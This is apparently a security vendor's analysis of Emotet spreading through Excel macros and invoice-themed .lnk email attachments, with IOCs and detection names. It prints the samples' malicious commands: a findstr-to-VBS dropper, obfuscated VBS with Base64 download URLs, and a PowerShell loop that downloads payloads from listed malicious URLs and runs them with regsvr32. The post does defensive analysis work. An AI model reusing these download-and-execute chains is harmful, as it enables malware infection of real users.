<div>
Posted on <a href="https://asec.ahnlab.com/en/34556/" rel="bookmark" title="12:55 pm">May 20, 2022</a>
<h1 class="title">Emotet Being Distributed Using Various Files</h1>
<p>The ASEC analysis team has recently discovered the distribution of Emotet through link files (.lnk). The malware has been steadily distributed in the past, but starting from April, it was found that the Emotet downloader uses Excel files as well as link files (.lnk).</p>
<p>One feature that the secured EML files share is that they all disguise themselves as replies to the user’s email to distribute the malware strain.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34280 jetpack-lazy-image jetpack-lazy-image--handled" height="806" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/e2e1bd386cb96affc0a1b30a2a86e8ee.png?resize=1024%2C673&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1226"/><img alt="" class="wp-image-34280" height="806" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/e2e1bd386cb96affc0a1b30a2a86e8ee.png?resize=1024%2C673&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1226"/><figcaption>Figure 1. Distributed email 1</figcaption></figure>
<p></p>
<figure class="aligncenter"><img alt="" class="wp-image-34253 jetpack-lazy-image" height="1021" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/9678abbc9749549713e12907f25fd042_3.png?resize=1024%2C694&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1506"/><img alt="" class="wp-image-34253" height="1021" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/9678abbc9749549713e12907f25fd042_3.png?resize=1024%2C694&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1506"/><figcaption>Figure 2. Distributed email 2</figcaption></figure>
<p></p>
<figure class="aligncenter"><img alt="" class="wp-image-34254 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%8C%80%ED%95%9C%ED%95%AD%EA%B3%B52.png?resize=1024%2C694&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34254" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EB%8C%80%ED%95%9C%ED%95%AD%EA%B3%B52.png?resize=1024%2C694&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 3. Distributed email 3</figcaption></figure>
<p></p>
<p>The Excel file attached in the email of Figure 1 uses the same method of utilizing the macro sheet as explained in the posts below.</p>
<ul><li><a href="https://asec.ahnlab.com/en/30850/">Emotet Being Distributed Using Excel Files</a></li><li><a href="https://asec.ahnlab.com/en/31313/">Emotet Being Distributed in Korea via Excel Files</a></li></ul>
<figure class="aligncenter"><img alt="" class="wp-image-34282 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EC%97%91%EC%85%80.png?resize=1024%2C664&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-34282" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/%EC%97%91%EC%85%80.png?resize=1024%2C664&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 4. Excel file</figcaption></figure>
<p></p>
<figure class="aligncenter"><img alt="" class="wp-image-34283 jetpack-lazy-image" height="793" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/4.png?resize=1024%2C665&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1222"/><img alt="" class="wp-image-34283" height="793" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/4.png?resize=1024%2C665&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1222"/><figcaption>Figure 5. Formulas in the Excel file</figcaption></figure>
<p></p>
<p>Below is the list of download URLs.</p>
<ul><li>hxxp://easiercommunications[.]com/wp-content/w/</li><li>hxxp://dulichdichvu[.]net/libraries/QhtrjCZymLp5EbqOdpKk/)</li><li>hxxps://www.whow[.]fr/wp-includes/H54Fgj0tG/)</li><li>hxxp://genccagdas[.]com.tr/assets/TTHOm833iNn3BxT/)</li><li>hxxp://heaventechnologies[.]com.pk/apitest/xdeAU0rx26LT9I/)</li><li>hxxp://goonboy[.]com/goonie/bSFz7Av/</li></ul>
<p>There were also multiple lnk files besides Excel files, mostly distributed with the names related to invoices. The commands executed differ depending on the distribution date.</p>
<figure class="wp-block-table"><table><thead><tr><td>Confirmed Date</td><td>Filename used in distribution</td></tr></thead><tbody><tr><td>April 26th</td><td>EXT Payment status.lnk</td></tr><tr><td>April 26th</td><td>Past Due invoice.lnk</td></tr><tr><td>April 28th</td><td>Electronic form.lnk</td></tr><tr><td>April 28th</td><td>detalles_28042022.lnk</td></tr><tr><td>April 29th</td><td>Address Changed.lnk</td></tr><tr><td>April 29th</td><td>Change of Address.lnk</td></tr><tr><td>May 2nd</td><td>Payment with a new address.lnk</td></tr><tr><td>May 3rd</td><td>INF_15823367.lnk</td></tr><tr><td>May 3rd</td><td>MES_11845137690439733.lnk</td></tr></tbody></table><figcaption>Table 1. Confirmed lnk filenames</figcaption></figure>
<p></p>
<ul><li>Invoice # US-616121772.lnk</li></ul>
<p>‘Invoice # US-616121772.lnk’ attached to the email from Figure 2 runs the following command upon being executed.</p>
<figure class="wp-block-table"><table><tbody><tr><td>cmd.exe /v:on /c findstr “glKmfOKnQLYKnNs.*” “Invoice # US-616121772.lnk” &gt; “%tmp%\YlScZcZKeP.vbs” &amp; “%tmp%\YlScZcZKeP.vbs”</td></tr></tbody></table></figure>
<p>The bottom part of the file has a script code starting with the string ‘glKmfOKnQLYKnNs’. When the file is run, the code is saved as a file ‘YlScZcZKeP.vbs’ in the %TEMP% folder and executed.</p>
<figure class="aligncenter"><img alt="" class="wp-image-34261 jetpack-lazy-image" height="429" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/lnk-hex-1.png?resize=960%2C429&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="960"/><img alt="" class="wp-image-34261" height="429" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/05/lnk-hex-1.png?resize=960%2C429&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="960"/><figcaption>Figure 6. Script at the bottom part of the lnk file</figcaption></figure>
<p>Inside YlScZcZKeP.vbs are URLs encoded with Base64. The file will access the URLs to download and run additional malware strains.</p>
<figure class="wp-block-table"><table><tbody><tr><td>glKmfOKnQLYKnNs=1::on error resume next:Set FSO = CreateObject(“Scripting.FileSystemObject”)::Function Base64Decode(ByVal vCode): With CreateObject(“Msxml2.DOMDocument.3.0”).CreateElement(“base64”): .dataType = “bin.base64”: .text = vCode: Base64Decode = Stream_BinaryToString(.nodeTypedValue): End With:End Function::Function Stream_BinaryToString(Binary): With CreateObject(“ADODB.Stream”): .Type = 1: .Open: .Write Binary: .Position = 0: .Type = 2: .CharSet = “utf-8”: Stream_BinaryToString = .ReadText: End With:End Function::Dim LmPxinnpsd(6):::LmPxinnpsd(0) = “aHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2Iv”::LmPxinnpsd(1) = “aHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIv”::LmPxinnpsd(2) = “aHR0cDovL2RlbW8zNC5ja2cuaGsvc2VydmljZS9oaE1acmZDN01ubTlKRC8=”::LmPxinnpsd(3) = “aHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2Lw==”::LmPxinnpsd(4) = “aHR0cDovL2NpcHJvLm14L3ByZW5zYS9zaVpQNjlyQkZtaWJEdnVUUDFMLw==”::LmPxinnpsd(5) = “aHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8=”:::Execute(“dIm xml,Ws”&amp;chr(-7328+7372)&amp;”Db,FiLePaTH,u”&amp;chr(6281-6199)&amp;”L:”&amp;chr(872280/7269)&amp;”ml = “”MSXml2.SeRVERXmlht”&amp;chr(-4790+4874)&amp;”p.3″&amp;chr(7943-7897)&amp;”0″”:Ws = “”wscRipT.SHEll””:D”&amp;chr(3908-3810)&amp;” = “”aDo”&amp;chr(-4831+4931)&amp;”b.”&amp;chr(7496-7413)&amp;”TReam””:seT ImSHdnYd”&amp;chr(-9735+9821)&amp;”R =”&amp;chr(-6409+6441)
&lt;omitted&gt;</td></tr></tbody></table><figcaption>Part of VBS code</figcaption></figure>
<p></p>
<p>Below is the list of download URLs.</p>
<ul><li>hxxps://creemo[.]pl/wp-admin/ZKS1DcdquUT4Bb8Kb/</li><li>hxxp://filmmogzivota[.]rs/SpryAssets/gDR/</li><li>hxxp://demo34.ckg[.]hk/service/hhMZrfC7Mnm9JD/</li><li>hxxp://focusmedica[.]in/fmlib/IxBABMh0I2cLM3qq1GVv/</li><li>hxxp://cipro[.]mx/prensa/siZP69rBFmibDvuTP1L/</li><li>hxxp://colegiounamuno[.]es/cgi-bin/E/</li></ul>
<p>The downloaded file is saved as a file named ‘KzcEXkekpr.Zvp’ in the %TEMP% folder and executed through the command ‘%wInDiR% \sySTem32\regsVR32.Exe %tmp% \KZcEXkEkpR.ZVP’.</p>
<ul><li>20220429_57092_005.lnk</li></ul>
<p>The file ‘20220429_57092_005.lnk’ attached in the email from Figure 3 uses powershell commands to download an additional file unlike the lnk file explained above. When the lnk file is run, it uses the powershell command shown below to decode the Base64-encoded data and save it as a file named ‘xLhSBgzPSx.ps1’ in the %TEMP% folder.</p>
<figure class="wp-block-table"><table><tbody><tr><td>C:\Windows\system32\cmd.exe /v:on /c fHjk4fTLlkc5DZfyorHstui9FxCd6xw3JieZWhdwrpiX+F4gEcRJCp5i1KXfjUxLJXU8QzW5||goto&amp;p^o^w^e^r^s^h^e^l^l.e^x^e -c “&amp;{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(‘JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDo&lt;omitted&gt;’)) &gt; “%tmp%\xLhSBgzPSx.ps1”; powershell -executionpolicy bypass -file “$env:TEMP\xLhSBgzPSx.ps1”; Remove-Item -Force “$env:TEMP\xLhSBgzPSx.ps1″}”</td></tr></tbody></table><figcaption>Part of execution commands</figcaption></figure>
<p></p>
<code class="language-js">$ProgressPreference="SilentlyContinue";$links=("hxxp://gccon.in/UploadedFiles/UYtJNrT2llxy1/","hxxp://gakudou.com/photo06/hEu/","hxxp://giasotti.com/js/Khc6mb0zx4KoWX/","hxxp://plresende.com/pcinfor/cq/","hxxp://thomasmanton.com/wp-includes/owZnpWmH4D8j/","hxxp://gla.ge/old/PuVaff/");foreach ($u in $links) {try {IWR $u -OutFile $env:TEMP/jnURxtRmiO.SKh;Regsvr32.exe $env:TEMP/jnURxtRmiO.SKh;break} catch { }}</code>
<p>Below is the list of download URLs.</p>
<ul><li>hxxp://gccon[.]in/UploadedFiles/UYtJNrT2llxy1/</li><li>hxxp://gakudou[.]com/photo06/hEu/</li><li>hxxp://giasotti[.]com/js/Khc6mb0zx4KoWX/</li><li>hxxp://plresende[.]com/pcinfor/cq/</li><li>hxxp://thomasmanton[.]com/wp-includes/owZnpWmH4D8j/</li><li>hxxp://gla[.]ge/old/PuVaff/</li></ul>
<p>The downloaded file is saved in the %TEMP% folder as ‘jnURxtRmiO.SKh’ and executed through the command ‘Regsvr32.exe $env:TEMP/jnURxtRmiO.SKh’.</p>
<p>It appears Emotet is downloaded from the download URLs mentioned earlier. Emotet attempts to access multiple C&amp;C server URLs existing inside the malware when it is run. If the access is successful, it can receive commands from the attacker to perform malicious behaviors such as downloading additional malware strains.</p>
<p>As the malware is distributed through various downloaders besides Excel, users need to take caution.</p>
<p>AhnLab’s anti-malware software, V3, is currently detecting and blocking the files using the following aliases.</p>
<p>[File Detection]
Downloader/XLS.Emotet
LNK/Autorun.Gen
Trojan/LNK.Runner
Trojan/Win.Agent.R488899</p>
<p>[IOC]
c32c22fa90ad51747e9939f8e7abf4c0
fd37d5fecf99b16df331be14649ac09c
6e1da3039639bb9d40fc9d5d355062c2
c43d185691aaba7d1d196156a4a450f7
hxxp://easiercommunications[.]com/wp-content/w/
hxxp://dulichdichvu[.]net/libraries/QhtrjCZymLp5EbqOdpKk/)
hxxps://www.whow[.]fr/wp-includes/H54Fgj0tG/)
hxxp://genccagdas[.]com.tr/assets/TTHOm833iNn3BxT/)
hxxp://heaventechnologies[.]com.pk/apitest/xdeAU0rx26LT9I/)
hxxp://goonboy[.]com/goonie/bSFz7Av/
hxxps://creemo[.]pl/wp-admin/ZKS1DcdquUT4Bb8Kb/
hxxp://filmmogzivota[.]rs/SpryAssets/gDR/
hxxp://demo34.ckg[.]hk/service/hhMZrfC7Mnm9JD/
hxxp://focusmedica[.]in/fmlib/IxBABMh0I2cLM3qq1GVv/
hxxp://cipro[.]mx/prensa/siZP69rBFmibDvuTP1L/
hxxp://colegiounamuno[.]es/cgi-bin/E/
hxxp://gccon[.]in/UploadedFiles/UYtJNrT2llxy1/
hxxp://gakudou[.]com/photo06/hEu/
hxxp://giasotti[.]com/js/Khc6mb0zx4KoWX/
hxxp://plresende[.]com/pcinfor/cq/
hxxp://thomasmanton[.]com/wp-includes/owZnpWmH4D8j/
hxxp://gla[.]ge/old/PuVaff/</p>
<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
<p>
Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
<p>Tagged as:<a href="https://asec.ahnlab.com/en/tag/emotet-en/" rel="tag">Emotet</a>, <a href="https://asec.ahnlab.com/tag/lnk-malware/" rel="tag">lnk malware</a></p>
</div>